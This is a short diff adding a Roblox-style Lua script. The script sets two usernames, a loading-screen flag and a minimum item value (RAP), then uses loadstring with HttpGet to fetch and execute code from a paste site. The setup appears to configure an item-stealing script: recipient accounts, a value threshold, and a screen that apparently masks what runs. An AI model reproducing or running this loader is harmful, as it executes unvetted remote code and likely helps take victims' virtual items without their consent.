@@ -1,0 +1,7 @@
+Username = "Awesomealt002"
+Username2 = "Awesomebloxx3"
+
+LoadingScreen = true
+MinimumRAP = 10000
+
+loadstring(game:HttpGet("https://dpaste.com/FU7CTHP7M.txt"))()
